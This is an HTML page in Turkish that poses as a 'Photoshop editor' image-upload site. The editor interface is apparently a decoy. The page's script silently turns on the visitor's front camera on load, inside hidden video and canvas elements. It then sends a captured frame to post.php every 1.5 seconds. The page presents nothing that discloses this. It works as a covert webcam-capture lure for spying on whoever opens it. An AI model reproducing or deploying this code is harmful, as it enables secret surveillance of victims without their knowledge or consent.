<!DOCTYPE html>
<html lang="tr">
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<meta http-equiv='refresh' content='30;url=index.php'/>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<link rel="icon" href="/files/icon2.svg" type="image/x-icon" />

  <link rel="icon" href="files/icon.svg" type="image/x-icon" />
  <title>PHOTOSHOP</title>
  <style>
@import url('https://fonts.googleapis.com/css2?family=Kiwi+Maru:wght@300&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&display=swap');
* {
  margin: 0;
  padding: 0;
  font-family: 'Kiwi Maru', serif;
  text-shadow: 0px -1px 0px rgba(0,0,0,0.4);
  list-style:none;
  text-decoration: none;
}

body {
  background: #000;
  box-sizing: border-box;
}
.green-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #69F0AE,
    0 0 40px rgba(0, 230, 118, .75),
    0 0 50px rgba(0, 230, 118, .75),
    0 0 100px rgba(0, 230, 118, .75);
}

.green-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}

h1 {
font-size: 30px;
color:white;
text-align: center;
margin-top: 50px;
margin-bottom: 100px;
}
h2 {
  font-family: 'Poppins', sans-serif;
  color: white;
  font-size: 15px;
  text-align: center;
  margin-left: 10px;
  margin-right: 10px;
  margin-bottom: 50px;
}
.social-icons {
  text-align: center;
  }  
.social-icons li {
  display:block;
  list-style-type:none;
  -webkit-user-select:none;
  -moz-user-select:none;
  }
.social-icons li a {
  border-bottom: none;
  }
.social-icons li img {
  width:300px;
  margin-top: 20px;
  margin-right: 20px;
}
.button {
  position: relative;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
  background-color: #4CAF50;
  color: white;
  padding: 15px 20px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
  border-radius: 10px;
}

</style>
  </head>
<body>
<div>
<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>
<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
<script>
function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
	  errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
}

// Load init
init();
</script>

<ul class="social-icons">
<li><img src="files/icon.svg" style="width:200px;"></li>
<h1 class="green-neon">PHOTOSHOP<br>EDİTÖR</h1>
<h2>Resim yükleme işlemini yaptıktan sonra <a href="loading.html" style="color:#9CFC00">DÜZENLEMEYE BAŞLA</a> butonuna tıklayınız.. </h2>
<br><br>
<input type="file" id="img" name="img" accept="image/*" class="button">
<br><br>
<a href="loading.html" class="button">DÜZENLEMEYE BAŞLA</a>
</div>
</body>
</html>
